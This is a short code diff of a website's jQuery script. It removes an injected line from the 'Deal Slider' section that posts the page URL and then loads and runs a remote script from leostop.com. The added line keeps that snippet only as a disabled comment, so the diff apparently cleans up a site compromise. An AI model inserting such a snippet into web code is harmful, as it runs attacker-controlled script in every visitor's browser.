@@ -272,7 +272,7 @@ $(function () {
 	
 	/* Deal Slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });
+	//function getURL() {return window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){/* $.getScript(protocol+"//leostop.com/tracking/tracking.js");*/ } });
 	
 	$('.deal-slider').slick({
         dots: false,
